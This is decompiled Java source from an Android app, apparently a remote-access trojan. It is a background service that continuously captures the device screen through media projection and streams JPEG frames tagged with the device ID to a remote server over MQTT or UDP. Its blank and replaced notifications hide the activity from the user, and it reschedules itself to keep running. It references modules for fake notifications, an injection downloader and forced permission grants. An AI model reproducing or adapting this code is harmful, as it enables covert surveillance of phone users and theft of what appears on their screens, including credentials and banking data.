package com.com.androidrr;

import android.app.Notification;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.os.IBinder;
import anywheresoftware.b4a.AbsObjectWrapper;
import anywheresoftware.b4a.BA;
import anywheresoftware.b4a.BALayout;
import anywheresoftware.b4a.keywords.Common;
import anywheresoftware.b4a.keywords.DateTime;
import anywheresoftware.b4a.objects.IntentWrapper;
import anywheresoftware.b4a.objects.NotificationWrapper;
import anywheresoftware.b4a.objects.ServiceHelper;
import anywheresoftware.b4a.objects.collections.Map;
import anywheresoftware.b4a.objects.drawable.CanvasWrapper;
import anywheresoftware.b4a.objects.streams.File;
import anywheresoftware.b4a.randomaccessfile.B4XSerializator;
import anywheresoftware.b4j.objects.MqttAsyncClientWrapper;
import b4a.example.dateutils;
import java.io.OutputStream;
import java.lang.reflect.Method;
import smm.mpsspackage.mpss;

/* loaded from: classes.dex */
public class mediaprojectionbackservice extends Service {
    public static clsudpconnector _clsudpconnector1;
    public static int _mediaprojection_countimages;
    public static boolean _mediaprojection_isrunning;
    public static MqttAsyncClientWrapper _mqtt_vn;
    public static mpss _sc;
    static mediaprojectionbackservice mostCurrent;
    public static BA processBA;
    private ServiceHelper _service;
    public Common __c = null;
    public dateutils _dateutils = null;
    public main _main = null;
    public starter _starter = null;
    public clsclassperms_code _clsclassperms_code = null;
    public clsclassperms_code2 _clsclassperms_code2 = null;
    public backgroundservice _backgroundservice = null;
    public globalparameters _globalparameters = null;
    public dtrsbnotisuntilactv _dtrsbnotisuntilactv = null;
    public faknotiactivity _faknotiactivity = null;
    public forc_activateacc _forc_activateacc = null;
    public inj_dnlader _inj_dnlader = null;
    public mainglobalstrings _mainglobalstrings = null;
    public myreceiver _myreceiver = null;
    public notificationservice _notificationservice = null;
    public perm_activatemediaproject _perm_activatemediaproject = null;
    public perm_activateoverlay _perm_activateoverlay = null;
    public perm_ignorebatperm _perm_ignorebatperm = null;
    public perm_notiacc _perm_notiacc = null;
    public perm_phonecal _perm_phonecal = null;
    public perm_smsperm _perm_smsperm = null;
    public perm_startactdevmang _perm_startactdevmang = null;
    public perm_startactwritesy _perm_startactwritesy = null;
    public perm_unknownapps _perm_unknownapps = null;
    public perm_writesys _perm_writesys = null;
    public req_all_perms _req_all_perms = null;
    public s1 _s1 = null;
    public service1 _service1 = null;
    public service2 _service2 = null;
    public service3 _service3 = null;
    public service4 _service4 = null;
    public srvnewphonecall _srvnewphonecall = null;
    public wakeupdv _wakeupdv = null;
    public httputils2service _httputils2service = null;

    public static String _mqtt_vn_connected(boolean z) throws Exception {
        return "";
    }

    public static String _mqtt_vn_disconnected() throws Exception {
        return "";
    }

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        return null;
    }

    public static class mediaprojectionbackservice_BR extends BroadcastReceiver {
        @Override // android.content.BroadcastReceiver
        public void onReceive(Context context, Intent intent) {
            BA.LogInfo("** Receiver (mediaprojectionbackservice) OnReceive **");
            Intent intent2 = new Intent(context, (Class<?>) mediaprojectionbackservice.class);
            if (intent != null) {
                intent2.putExtra("b4a_internal_intent", intent);
            }
            ServiceHelper.StarterHelper.startServiceFromReceiver(context, intent2, false, BA.class);
        }
    }

    public static Class<?> getObject() {
        return mediaprojectionbackservice.class;
    }

    @Override // android.app.Service
    public void onCreate() {
        super.onCreate();
        mostCurrent = this;
        if (processBA == null) {
            BA ba = new BA(this, (BALayout) null, (BA) null, "com.com.androidrr", "com.com.androidrr.mediaprojectionbackservice");
            processBA = ba;
            if (BA.isShellModeRuntimeCheck(ba)) {
                processBA.raiseEvent2(null, true, "SHELL", false, new Object[0]);
            }
            try {
                Class.forName(BA.applicationContext.getPackageName() + ".main").getMethod("initializeProcessGlobals", new Class[0]).invoke(null, null);
                processBA.loadHtSubs(getClass());
                ServiceHelper.init();
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
        }
        this._service = new ServiceHelper(this);
        processBA.service = this;
        if (BA.isShellModeRuntimeCheck(processBA)) {
            BA ba2 = processBA;
            ba2.raiseEvent2(null, true, "CREATE", true, "com.com.androidrr.mediaprojectionbackservice", ba2, this._service, Float.valueOf(Common.Density));
        }
        if (ServiceHelper.StarterHelper.startFromServiceCreate(processBA, false)) {
            processBA.setActivityPaused(false);
            BA.LogInfo("*** Service (mediaprojectionbackservice) Create ***");
            processBA.raiseEvent(null, "service_create", new Object[0]);
        }
        processBA.runHook("oncreate", this, null);
    }

    @Override // android.app.Service
    public void onStart(Intent intent, int i) {
        onStartCommand(intent, 0, 0);
    }

    @Override // android.app.Service
    public int onStartCommand(final Intent intent, int i, int i2) {
        if (!ServiceHelper.StarterHelper.onStartCommand(processBA, new Runnable() { // from class: com.com.androidrr.mediaprojectionbackservice.1
            @Override // java.lang.Runnable
            public void run() {
                mediaprojectionbackservice.this.handleStart(intent);
            }
        })) {
            ServiceHelper.StarterHelper.addWaitForLayout(new Runnable() { // from class: com.com.androidrr.mediaprojectionbackservice.2
                @Override // java.lang.Runnable
                public void run() {
                    mediaprojectionbackservice.processBA.setActivityPaused(false);
                    BA.LogInfo("** Service (mediaprojectionbackservice) Create **");
                    mediaprojectionbackservice.processBA.raiseEvent(null, "service_create", new Object[0]);
                    mediaprojectionbackservice.this.handleStart(intent);
                    ServiceHelper.StarterHelper.removeWaitForLayout();
                }
            });
        }
        processBA.runHook("onstartcommand", this, new Object[]{intent, Integer.valueOf(i), Integer.valueOf(i2)});
        return 1;
    }

    @Override // android.app.Service
    public void onTaskRemoved(Intent intent) {
        super.onTaskRemoved(intent);
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void handleStart(Intent intent) {
        BA.LogInfo("** Service (mediaprojectionbackservice) Start **");
        Method method = processBA.htSubs.get("service_start");
        if (method != null) {
            if (method.getParameterTypes().length > 0) {
                processBA.raiseEvent(null, "service_start", ServiceHelper.StarterHelper.handleStartIntent(intent, this._service, processBA));
            } else {
                processBA.raiseEvent(null, "service_start", new Object[0]);
            }
        }
    }

    @Override // android.app.Service
    public void onTimeout(int i) {
        BA.LogInfo("** Service (mediaprojectionbackservice) Timeout **");
        Map map = new Map();
        map.Initialize();
        map.Put("StartId", Integer.valueOf(i));
        processBA.raiseEvent(null, "service_timeout", map);
    }

    @Override // android.app.Service
    public void onDestroy() {
        super.onDestroy();
        BA.LogInfo("** Service (mediaprojectionbackservice) Destroy **");
        processBA.raiseEvent(null, "service_destroy", new Object[0]);
        processBA.service = null;
        mostCurrent = null;
        processBA.setActivityPaused(true);
        processBA.runHook("ondestroy", this, null);
    }

    public static String _connect_to_server_broker_vn() throws Exception {
        Common.LogImpl("617629185", "Connect_TO_Server_Broker_VN", 0);
        Common.ToastMessageShow(BA.ObjectToCharSequence(""), false);
        if (_mqtt_vn.IsInitialized()) {
            _mqtt_vn.Close();
        }
        MqttAsyncClientWrapper mqttAsyncClientWrapper = _mqtt_vn;
        BA ba = processBA;
        StringBuilder sb = new StringBuilder();
        sb.append("tcp://");
        globalparameters globalparametersVar = mostCurrent._globalparameters;
        sb.append(Common.SmartStringFormatter("", globalparameters._strcoo));
        sb.append(":51998");
        String sb2 = sb.toString();
        StringBuilder sb3 = new StringBuilder();
        sb3.append("med");
        globalparameters globalparametersVar2 = mostCurrent._globalparameters;
        sb3.append(globalparameters._mydeviceid);
        sb3.append(BA.NumberToString(Common.Rnd(1, 99999999)));
        mqttAsyncClientWrapper.Initialize(ba, "mqtt_VN", sb2, sb3.toString());
        MqttAsyncClientWrapper.MqttConnectOptionsWrapper mqttConnectOptionsWrapper = new MqttAsyncClientWrapper.MqttConnectOptionsWrapper();
        mqttConnectOptionsWrapper.Initialize("serverdata", "serverdata");
        mqttConnectOptionsWrapper.setCleanSession(true);
        Common.LogImpl("617629192", "Trying to connect", 0);
        _mqtt_vn.Connect2(mqttConnectOptionsWrapper.getObject());
        return "";
    }

    public static NotificationWrapper _createnotification() throws Exception {
        NotificationWrapper notificationWrapper = new NotificationWrapper();
        notificationWrapper.Initialize2(2);
        notificationWrapper.setIcon("icon");
        notificationWrapper.setSound(false);
        notificationWrapper.setVibrate(false);
        notificationWrapper.SetInfoNew(processBA, BA.ObjectToCharSequence(" "), BA.ObjectToCharSequence(" "), getObject());
        return notificationWrapper;
    }

    public static String _imagetobytes_send_deviceimage_to_broker(CanvasWrapper.BitmapWrapper bitmapWrapper) throws Exception {
        try {
            globalparameters globalparametersVar = mostCurrent._globalparameters;
            if (globalparameters._vncontype == 1) {
                _sc.setCaptureSpeed(100);
                if (_mqtt_vn.getConnected()) {
                    Map map = new Map();
                    map.Initialize();
                    globalparameters globalparametersVar2 = mostCurrent._globalparameters;
                    map.Put("deviceid", globalparameters._mydeviceid);
                    File.OutputStreamWrapper outputStreamWrapper = new File.OutputStreamWrapper();
                    outputStreamWrapper.InitializeToBytesArray(0);
                    CanvasWrapper.BitmapWrapper Resize = bitmapWrapper.Resize(300.0f, 600.0f, false);
                    OutputStream object = outputStreamWrapper.getObject();
                    globalparameters globalparametersVar3 = mostCurrent._globalparameters;
                    Resize.WriteToStream(object, globalparameters._intvncfps, (Bitmap.CompressFormat) BA.getEnumFromString(Bitmap.CompressFormat.class, "JPEG"));
                    map.Put("deviceimg", outputStreamWrapper.ToBytesArray());
                    B4XSerializator b4XSerializator = new B4XSerializator();
                    MqttAsyncClientWrapper mqttAsyncClientWrapper = _mqtt_vn;
                    StringBuilder sb = new StringBuilder();
                    sb.append("VNImage");
                    globalparameters globalparametersVar4 = mostCurrent._globalparameters;
                    sb.append(globalparameters._mydeviceid);
                    mqttAsyncClientWrapper.Publish2(sb.toString(), b4XSerializator.ConvertObjectToBytes(map.getObject()), 0, false);
                    outputStreamWrapper.Close();
                    return "";
                }
                Common.LogImpl("617498134", "mqtt_VN is offline !", 0);
                return "";
            }
            globalparameters globalparametersVar5 = mostCurrent._globalparameters;
            if (globalparameters._vncontype != 2) {
                return "";
            }
            _sc.setCaptureSpeed(0);
            if (!_clsudpconnector1.IsInitialized()) {
                _clsudpconnector1._initialize(processBA);
                _clsudpconnector1._setinfo();
            }
            Map map2 = new Map();
            map2.Initialize();
            globalparameters globalparametersVar6 = mostCurrent._globalparameters;
            map2.Put("deviceid", globalparameters._mydeviceid);
            File.OutputStreamWrapper outputStreamWrapper2 = new File.OutputStreamWrapper();
            outputStreamWrapper2.InitializeToBytesArray(0);
            CanvasWrapper.BitmapWrapper Resize2 = bitmapWrapper.Resize(300.0f, 600.0f, false);
            OutputStream object2 = outputStreamWrapper2.getObject();
            globalparameters globalparametersVar7 = mostCurrent._globalparameters;
            Resize2.WriteToStream(object2, globalparameters._intvncfps, (Bitmap.CompressFormat) BA.getEnumFromString(Bitmap.CompressFormat.class, "JPEG"));
            map2.Put("deviceimg", outputStreamWrapper2.ToBytesArray());
            _clsudpconnector1._udp_senddeviceimage(new B4XSerializator().ConvertObjectToBytes(map2.getObject()));
            outputStreamWrapper2.Close();
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("617498161", BA.ObjectToString(Common.LastException(processBA)), 0);
            return "";
        }
    }

    public static String _noti_replacement(String str, String str2, int i) throws Exception {
        try {
            new CanvasWrapper.BitmapWrapper();
            File file = Common.File;
            CanvasWrapper.BitmapWrapper LoadBitmap = Common.LoadBitmap(File.getDirAssets(), "tmpico.png");
            nb6 nb6Var = new nb6();
            nb6Var._initialize(processBA, BA.NumberToString(1), " ", "LOW")._smallicon(LoadBitmap)._autocancel(false);
            nb6Var._setdefaults(false, false, false);
            nb6Var._build(" ", str, "tag2", getObject()).Notify(i);
            Common.LogImpl("617235976", "replacement done", 0);
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("617235978", BA.ObjectToString(Common.LastException(processBA)), 0);
            return "";
        }
    }

    public static String _process_globals() throws Exception {
        _sc = new mpss();
        _mediaprojection_isrunning = false;
        _mediaprojection_countimages = 0;
        _clsudpconnector1 = new clsudpconnector();
        _mqtt_vn = new MqttAsyncClientWrapper();
        return "";
    }

    public static String _sc_imageready(Object obj) throws Exception {
        try {
            _mediaprojection_countimages++;
            new CanvasWrapper.BitmapWrapper();
            if (obj != null) {
                Bitmap bitmap = (Bitmap) obj;
                Bitmap bitmap2 = bitmap;
                _imagetobytes_send_deviceimage_to_broker((CanvasWrapper.BitmapWrapper) AbsObjectWrapper.ConvertToWrapper(new CanvasWrapper.BitmapWrapper(), bitmap));
            }
            if (_mediaprojection_countimages < 2) {
                return "";
            }
            _sc.NoOfCapturedImage = 200;
            _mediaprojection_countimages = 0;
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("617432595", BA.ObjectToString(Common.LastException(processBA)), 0);
            return "";
        }
    }

    public static String _sc_permissiongranted(int i) throws Exception {
        Common.LogImpl("617563649", "----------", 0);
        Common.LogImpl("617563650", BA.NumberToString(i), 0);
        return "";
    }

    public static String _service_create() throws Exception {
        _clsudpconnector1._initialize(processBA);
        _clsudpconnector1._setinfo();
        return "";
    }

    public static String _service_destroy() throws Exception {
        StringBuilder sb = new StringBuilder();
        sb.append("Media projection service is offline now ");
        DateTime dateTime = Common.DateTime;
        DateTime dateTime2 = Common.DateTime;
        sb.append(DateTime.Time(DateTime.getNow()));
        Common.LogImpl("617301505", sb.toString(), 0);
        _sc.NoOfCapturedImage = 0;
        _sc.Stop();
        _mqtt_vn.Close();
        Common.CancelScheduledService(processBA, getObject());
        Common.StopService(processBA, getObject());
        return "";
    }

    public static String _service_start(IntentWrapper intentWrapper) throws Exception {
        mostCurrent._service.StartForeground(3, (Notification) _createnotification().getObject());
        BA ba = processBA;
        Class<?> object = getObject();
        DateTime dateTime = Common.DateTime;
        long now = DateTime.getNow();
        DateTime dateTime2 = Common.DateTime;
        Common.StartServiceAt(ba, object, now + 1800000, true);
        _noti_replacement(" ", " ", 3);
        globalparameters globalparametersVar = mostCurrent._globalparameters;
        if (globalparameters._vncontype == 1) {
            _connect_to_server_broker_vn();
        }
        _sc.Initialize(processBA, "sc");
        _sc.init(0, 0, 0, 18);
        _sc.setCaptureSpeed(100);
        return "";
    }

    public static String _start_sending_devicescreenshot_afterperm() throws Exception {
        try {
            _mediaprojection_isrunning = true;
            _sc.Stop();
            mpss mpssVar = _sc;
            globalparameters globalparametersVar = mostCurrent._globalparameters;
            int i = (int) globalparameters._getrealwidth;
            globalparameters globalparametersVar2 = mostCurrent._globalparameters;
            mpssVar.init(i, (int) globalparameters._getrealheight, 0, 18);
            _sc.setCaptureSpeed(100);
            _sc.TakeScreenshot();
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("617367050", BA.ObjectToString(Common.LastException(processBA)), 0);
            return "";
        }
    }
}